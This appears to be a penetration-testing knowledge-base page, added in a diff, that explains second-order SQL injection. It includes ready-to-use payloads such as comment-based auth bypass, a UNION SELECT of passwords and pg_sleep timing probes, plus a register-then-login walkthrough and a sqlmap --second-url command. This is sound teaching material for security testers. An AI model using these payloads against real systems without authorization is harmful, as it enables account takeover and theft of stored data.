@@ -1,0 +1,117 @@
+---
+title: Second-order SQLi
+description: Injection that fires when previously-stored input is used in a later query.
+mitre: [T1190]
+d3fend: [D3-MH, D3-MA]
+impact: [DataExfil, AuthBypass]
+owasp: [A05]
+sidebar:
+  order: 9
+  label: Second-order
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+<Aside type="note">
+This page is a known stub. It will be expanded with detailed case studies as more source material becomes available.
+</Aside>
+
+The injection point and the trigger are different requests. You submit a payload through one form, the application stores it (safely-quoted), and later uses the stored value in a *different* query that doesn't re-quote it. The second query executes the injection.
+
+## TL;DR
+
+<Steps>
+
+1. Find an input that gets stored in the database (registration, profile update, comment, filename).
+2. Submit a payload that survives the initial insert as a literal string.
+3. Trigger the second query that reads the stored value (login, profile view, file lookup, search).
+4. Injection fires.
+
+</Steps>
+
+Common payload shapes:
+
+```
+admin'-- -
+admin' UNION SELECT password FROM users-- -
+admin'+(SELECT 1 FROM users WHERE pg_sleep(5))+'
+```
+
+## Why first-order tests miss it
+
+The first-order test (inject `'`, look for an error) only checks the immediate response. Second-order vulnerabilities have:
+
+<Steps>
+
+1. **Input request:** `POST /register` with `username=admin'-- -` - succeeds with HTTP 200, no error visible.
+2. **Storage:** Application uses parameterised insert, so the literal string `admin'-- -` lands in the database safely.
+3. **Trigger request:** `POST /login` with the same username. The login flow does `SELECT * FROM logs WHERE created_by = '<retrieved_username>'` - concatenating the stored value without re-quoting.
+4. **Injection fires** at step 3, not step 1.
+
+</Steps>
+
+<Aside type="tip">
+Standard SQLi scanners often miss this because they don't connect input requests to trigger requests. Manual testing or `--second-url` in `sqlmap` is required.
+</Aside>
+
+## Classic example: registration → login
+
+```
+# Step 1: Register
+POST /register
+username=admin'-- -&password=test123
+
+# Server: INSERT INTO users (username, password) VALUES (?, ?)  -- safe
+# Stored username: admin'-- -
+
+# Step 2: Login
+POST /login
+username=admin'-- -&password=test123
+
+# Server: SELECT * FROM users WHERE username='admin'-- -' AND password='...'
+# Comment removes password check → logged in as admin (or whichever account already exists)
+```
+
+## Other common second-order paths
+
+| Input request | Storage | Trigger request | Affected query |
+|---|---|---|---|
+| Update profile name | `users.name` | View dashboard | Activity-log query joins on name |
+| Upload file | `files.original_name` | Download | Lookup by original_name |
+| Set password (yes, sometimes) | `users.password` | Login or password change | Audit log |
+| Add comment | `comments.body` | Search | LIKE clause on body |
+| Set bio | `users.bio` | Public profile | Sometimes used in templating queries |
+
+## Detection workflow
+
+Manual:
+
+<Steps>
+
+1. Enumerate every field that gets stored.
+2. For each, register/submit with a benign-but-detectable payload like `' OR pg_sleep(0)-- -` - no behavioural impact.
+3. Walk through the application using the account/data that contains the payload.
+4. Look for any page where response time changes, errors appear, or behaviour shifts. That page is the trigger.
+5. Replace the benign payload with `pg_sleep(5)` or full extraction.
+
+</Steps>
+
+Automated:
+
+`sqlmap` has limited support - `--second-url` lets you specify a separate URL to fetch after each injection request:
+
+```bash
+sqlmap -u "https://<TARGET>/register" \
+  --data="username=test*&password=test" \
+  --second-url="https://<TARGET>/login" \
+  --technique=T --dbms=mysql
+```
+
+This is fragile - it works for simple register-then-login flows but not for multi-step workflows.
+
+## Notes
+
+- Second-order is harder to detect but often easier to *exploit* once found, because the trigger query is frequently the most privileged one (auth, admin actions).
+- Look for second-order in any application that does post-processing of stored user input: audit logs, search indexers, batch jobs, report generation.
+- Stored procedures and triggers can also fire second-order injection from data inserted by an unrelated path.
+
+{/* STUB: expand with case studies, automation patterns, and per-DBMS payload variations */}
